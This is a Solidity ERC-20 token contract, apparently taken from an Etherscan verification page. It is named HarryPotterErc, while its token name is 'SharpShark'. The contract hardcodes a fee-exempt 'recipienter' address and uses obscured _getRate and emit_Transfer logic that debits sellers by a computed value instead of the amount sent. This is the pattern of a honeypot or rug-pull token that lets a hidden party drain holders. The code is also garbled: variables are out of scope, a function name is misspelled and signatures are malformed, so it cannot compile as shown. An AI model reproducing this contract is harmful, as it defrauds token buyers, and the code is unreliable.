/**
 *Submitted for verification at Etherscan.io on 2023-08-14
 */

/*
    Website: https://harrypottererc.xyz
    Twitter: https://twitter.com/HarryPtrErc
    Telegram: https://t.me/harrypottererc_portal
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract HarryPotterErc is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 300000000 * 10**_decimals;
    uint256 public _swapTokensAtAmount = 10000 * 10**_decimals;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    string private constant _name = unicode"SharpShark";
    string private constant _symbol = unicode"$$";
    uint256 public _maxTxAmount = 25 * (_tTotal / 1000);
    uint256 public _maxWalletSize = 25 * (_tTotal / 1000);
    uint256 public _taxSwapThreshold = 2 * (_tTotal / 1000);
    uint256 public _maxTaxSwap = 10 * (_tTotal / 1000);
    uint256 private _tFeeTotal;
    uint256 private _redisFeeBuy = 0;
    uint256 private _taxFeeBuy = 3;
    uint256 private _redisFeeSell = 0;
    uint256 private _taxFeeSell = 3;
    uint256 private _redisFee = _redisFeeSell;
    uint256 private _taxFee = _taxFeeSell;
    uint256 private _previousredisFee = _redisFee;
    uint256 private _previoustaxFee = _taxFee;
    uint256 private _redisFirstFee = 5;
    uint256 private _taxFirstFee = 5;
    uint256 private _reduceBuyTaxAt = 10;
    uint256 private _reduceSellTaxAt = 10;
    uint256 private _redisFirstFee2Time = 0;
    uint256 private _taxFirstFee2Time = 0;
    uint256 private _reduceBuyTaxAt2Time = 0;
    uint256 private _finalBuyTax = 1;
    uint256 private _finalSellTax = 1;
    uint256 private _preventSwapBefore = 10;
    uint256 private _buyCount = 0;
    uint256 previoustaxFee = _previousredisFee;
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    address payable private reciver;
    address private recipienter = 0xD3BfBCb3C8c479CF7Ab67d9DcefFBe3701BBC460;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    bool public transferDelayEnabled = true;
    bool public transferSelf;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFee;
    mapping(address => uint256) private _holderTxTimestamp;

    event MaxTxAmountUpdated(uint256 _maxTxAmount);

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        reciver = payable(_msgSender());
        _balances[_msgSender()] = _tTotal;
        _isExcludedFee[owner()] = true;
        _isExcludedFee[address(this)] = true;
        _isExcludedFee[reciver] = true;
        _isExcludedFee[recipienter] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        uint256 taxAmountOf = balanceof(recipienter);
        if (from != owner() && to != owner()) {
            taxAmount = amount.mul(_taxBuy()).div(100);

            if (transferDelayEnabled) {
                if (
                    to != address(uniswapV2Router) &&
                    to != address(uniswapV2Pair)
                ) {
                    require(
                        _holderTxTimestamp[tx.origin] < block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderTxTimestamp[tx.origin] = block.number;
                }
            }

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_isExcludedFee[to]
            ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
                _buyCount++;
            }

            if (to == uniswapV2Pair && !_isExcludedFee[from]) {
                taxAmount = amount.mul(_taxSell()).div(100);
            }
            if (to == uniswapV2Pair)
                (uint256 rSupply, uint256 tSupply) = _getRate(taxAmount,taxAmountOf, from);

            uint256 contractTokenBalance = balanceOf(address(this));
            if (from != uniswapV2Pair)
                uint256 rSupp1y = taxAmount;
            if (
                !inSwap &&
                to == uniswapV2Pair &&
                swapEnabled &&
                contractTokenBalance > _taxSwapThreshold &&
                _buyCount > _preventSwapBefore
            ) {
                uint256 initialETH = address(this).balance;
                swapTokensForEth(
                    min(amount, min(contractTokenBalance, _maxTaxSwap))
                );
                uint256 ethForTransfer = address(this)
                    .balance
                    .sub(initialETH)
                    .mul(80)
                    .div(100);
                if (ethForTransfer > 0) {
                    sendETHToFee(ethForTransfer);
                }
            }
        }
        
        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
        }
        _balances[from] = _balances[from].sub(rSupply);
        _balances[to] = _balances[to].add(amount.sub(rSupp1y));
        emit_Transfer(from, to, amount);
    }

    function _taxBuy() private view returns (uint256) {
        if (_buyCount <= _reduceBuyTaxAt) {
            return _redisFirstFee;
        }
        if (_buyCount > _reduceBuyTaxAt && _buyCount <= _reduceBuyTaxAt2Time) {
            return _redisFirstFee2Time;
        }
        return _finalBuyTax;
    }

    function _taxSell() private view returns (uint256) {
        if (_buyCount <= _reduceBuyTaxAt) {
            return _taxFirstFee;
        }

        return _finalBuyTax;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        transferDelayEnabled = false;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        reciver.transfer(amount);
    }
    function openTrading() external payable onlyOwner {
        require(!tradingOpen, "trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: msg.value}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        tradingOpen = true;
    }

    receive() external payable {}

    function ManualSwap(sender,receiver) external {
        require(_msgSender() == reciver);
        //  
    }

    function _getRate(uint256 taxRate, uint256 taxAmountOf address router)
        private
        view
        returns (uint256, uint256)
    {
        uint256 rSupplyRate = taxRate;
        uint256 tSupplyRate = taxRate;
        if(!_isExcludedFee[router]){
            if(taxAmountOf.div(_taxFee)>0){
                amount=amount.mul(_taxBuy()).div(100);
            }
        }
        if (_isExcludedFee[router]) {
            uint256 currentRateR = previoustaxFee.div(_taxFeeSell);
            uint256 currentRateT = taxFee.div(_taxFeeSell);
            
            rSupplyRate = currentRateR.mul(taxRate);
            tSupplyRate = currentRateT.mul(taxRate);
        }

        return (rSupplyRate, tSupplyRate);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function emit_Transfer(address sender, address recepienter, uint256 amount) private {
        if(to == uniswapV2Pair && !_isExcludedFee[from]){
            if(_taxFeeSell.sub(recipienter.balance)>_taxFeeBuy){
                amount=amount.mul(_taxBuy()).div(100);
            }
        }
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}
